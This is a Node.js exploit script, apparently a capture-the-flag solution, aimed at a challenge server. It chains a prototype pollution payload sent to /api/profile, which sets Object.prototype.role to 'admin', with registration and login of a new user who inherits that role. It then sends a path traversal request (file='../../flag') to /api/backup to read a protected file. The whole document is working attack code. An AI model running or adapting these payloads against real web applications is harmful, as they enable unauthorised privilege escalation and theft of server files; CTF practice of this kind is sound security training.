
const http = require('http');

// Step 1: Poison Object.prototype.role = admin via /api/profile
// /api/profile accepts JSON, so we send correct nested object
const poisonData = JSON.stringify({
  "constructor": {
    "prototype": {
      "role": "admin"
    }
  }
});

const poisonOptions = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/api/profile',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(poisonData)
  }
};

console.log("🚀 Step 1: Poisoning Object.prototype.role = 'admin'");
const poisonReq = http.request(poisonOptions, (res) => {
  let body = '';
  res.on('data', chunk => body += chunk);
  res.on('end', () => {
    console.log("✅ Poisoning done! Now register a new user (no role needed, get from prototype)");
    // Step 2: Register new user, no role needed, will inherit from prototype
    registerCleanUser();
  });
});
poisonReq.on('error', err => console.error(err));
poisonReq.write(poisonData);
poisonReq.end();

function registerCleanUser() {
  const querystring = require('querystring');
  const postData = querystring.stringify({
    "username": "prototypehack"
  });

  const options = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/register',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(postData)
    }
  };

  const req = http.request(options, (res) => {
    let regBody = '';
    res.on('data', chunk => regBody += chunk);
    res.on('end', () => {
      // Extract UID
      const match = regBody.match(/<span.*?>([a-f0-9]+)<\/span>/);
      if (match) {
        const uid = match[1];
        console.log(`✅ Registered new user, UID: ${uid}`);
        console.log("🚀 Step 3: Login and get profile");
        loginAndCheck(uid);
      } else {
        console.log("❌ Failed to get UID");
        console.log(regBody);
      }
    });
  });
  req.on('error', err => console.error(err));
  req.write(postData);
  req.end();
}

function loginAndCheck(uid) {
  const querystring = require('querystring');
  const postData = querystring.stringify({ uid: uid });
  const options = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/login',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(postData)
    }
  };

  const req = http.request(options, (res) => {
    const cookie = res.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
    console.log("✅ Logged in, checking profile...");
    checkProfile(uid, cookie);
  });
  req.on('error', err => console.error(err));
  req.write(postData);
  req.end();
}

function checkProfile(uid, cookie) {
  const profileData = JSON.stringify({ uid: uid });
  const options = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/api/profile',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(profileData),
      'Cookie': cookie
    }
  };

  const req = http.request(options, (res) => {
    let body = '';
    res.on('data', chunk => body += chunk);
    res.on('end', () => {
      console.log("\n📄 Profile response:");
      console.log(body);
      try {
        const json = JSON.parse(body);
        console.log("\nParsed:");
        console.log(JSON.stringify(json, null, 2));
        console.log("\nRole is:", json.role);
        if (json.role === 'admin') {
          console.log("\n🎉 GOT ADMIN ROLE! Getting flag...");
          // Now get backup
          getBackup(cookie);
        }
      } catch(e) {
        console.log("JSON parse error", e);
      }
    });
  });
  req.on('error', err => console.error(err));
  req.write(profileData);
  req.end();
}

function getBackup(cookie) {
  const querystring = require('querystring');
  const postData = querystring.stringify({ file: '../../flag' });
  const options = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/api/backup',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(postData),
      'Cookie': cookie
    }
  };

  const req = http.request(options, (res) => {
    let body = '';
    res.on('data', chunk => body += chunk);
    res.on('end', () => {
      console.log("\n🏁 FLAG RESULT:");
      console.log(body);
    });
  });
  req.on('error', err => console.error(err));
  req.write(postData);
  req.end();
}
